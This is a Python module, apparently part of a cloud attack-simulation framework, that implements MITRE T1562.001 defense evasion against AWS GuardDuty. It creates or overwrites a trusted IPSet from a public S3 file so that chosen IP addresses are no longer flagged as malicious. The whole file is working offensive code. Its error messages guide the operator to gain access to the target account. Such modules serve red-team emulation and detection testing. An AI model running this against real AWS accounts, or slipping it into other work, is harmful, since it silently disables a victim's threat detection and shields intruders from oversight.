from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import boto3
from botocore.exceptions import ClientError

@TechniqueRegistry.register
class AWSModifyGuaddutyTrustedIP(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1562.001",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion"],
                sub_technique_name="Disable or Modify Tools"
            )
        ]
        super().__init__("Modify Guard Duty Trusted IP", "This function adds an IP address to the list of trusted IPs in GuardDuty to prevent the IP addresses from being flagged as malicious by GuardDuty, potentially evading detection. The technique requires the IP file to be accessible in a public S3 bucket (s3://bucket_name/object_name). Note: If an existing IPSet is configured on the detector, then the technique will attempt to replace it with the new IPSet which can have unintended consequences.", mitre_techniques)
        
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            detector_id:str = kwargs.get("detector_id", None)
            ip_file_s3_path:str = kwargs.get("ip_file_s3_path", None)
            ip_set_name:str = kwargs.get("ip_set_name", "HalberdTrustedIPSet")
            confirm_replace_existing_ip_set:str = kwargs.get("confirm_replace_existing_ip_set", False)

            # Input validation
            if detector_id in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required":"Detector ID"}
                }
            
            if ip_file_s3_path in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required":"IP File S3 Public Path"}
                }
            
            if confirm_replace_existing_ip_set in [None, ""]:
                confirm_replace_existing_ip_set = False # Require explicit confirmation

            if ip_set_name in [None, ""]:
                ip_set_name = "HalberdTrustedIPSet" # Give default name

            # Initialize boto3 guardduty client
            my_client = boto3.client('guardduty')
                
            raw_response = my_client.create_ip_set(
                DetectorId=detector_id,
                Name=ip_set_name,
                Format='TXT',
                Location=ip_file_s3_path,
                Activate=True
            )
            ip_set_id = raw_response['IpSetId']

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully addded trusted IP to Guard Duty detector {detector_id}",
                "value": {
                    "detector_id" : detector_id,
                    "ip_set_id" : ip_set_id,
                    "ip_file_location": ip_file_s3_path,
                    "trusted_ip_added" : True 
                }
            }

        except ClientError as e:
            if 'ipSet with the given name already exists' in str(e) or 'attempt to create resources beyond the current AWS account limits' in str(e):
                # Get ID of existing IP set
                if confirm_replace_existing_ip_set:
                    try:
                        list_response = my_client.list_ip_sets(DetectorId=detector_id)
                        ip_set_id = list_response['IpSetIds'][0]
                        
                        # Update the existing IP set
                        my_client.update_ip_set(
                            DetectorId=detector_id,
                            IpSetId=ip_set_id,
                            Location=ip_file_s3_path,
                            Activate=True
                        )

                        return ExecutionStatus.SUCCESS, {
                            "message": f"Successfully addded trusted IP to Guard Duty detector {detector_id}",
                            "value": {
                                "detector_id" : detector_id,
                                "ip_set_id" : ip_set_id,
                                "ip_file_location": ip_file_s3_path,
                                "trusted_ip_added" : True 
                            }
                        }
                    except Exception as e:
                        return ExecutionStatus.FAILURE, {
                            "error": str(e),
                            "message": "Failed to add update existing IP set in Guard Duty detector"
                        }

                else:
                    # Return failure if IP set replacement not confirmed
                    return ExecutionStatus.FAILURE, {
                        "error": "Failed to add trusted IP to detector - IP set already configured on detector. Re-attempt by enabling 'Replace Existing IP Set' toggle",
                        "message": "Failed to add trusted IP to detector - IP set already configured on detector. Re-attempt by enabling 'Replace Existing IP Set' toggle"
                    }
            if 'detectorId is not owned by the current account' in str(e):
                return ExecutionStatus.FAILURE, {
                    "error": "Failed to add trusted IP to detector - Target Detector ID is not owned by current account. Establish access or switch session to the right account (region must be same as the target detector) before attempting this technique.",
                    "message": "Failed to add trusted IP to detector - Target Detector ID is not owned by current account. Establish access or switch session to the right account (region must be same as the target detector) before attempting this technique."
                }
            else:
                return ExecutionStatus.FAILURE, {
                    "error": str(e),
                    "message": "Unexpected Error - Failed to add trusted IP to Guard Duty"
                }
                        
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Unexpected Error - Failed to add trusted IP to Guard Duty"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "detector_id": {"type": "str", "required": True, "default": None, "name": "Guard Duty Detector ID", "input_field_type" : "text"},
            "ip_file_s3_path": {"type": "str", "required": True, "default": None, "name": "IP File S3 Public Path", "input_field_type" : "text"},
            "ip_set_name": {"type": "str", "required": False, "default": "HalberdTrustedIPSet", "name": "New IP Set Name", "input_field_type" : "text"},
            "confirm_replace_existing_ip_set": {"type": "bool", "required": False, "default": False, "name": "Confirm Replace Existing IP Set", "input_field_type" : "bool"}
        }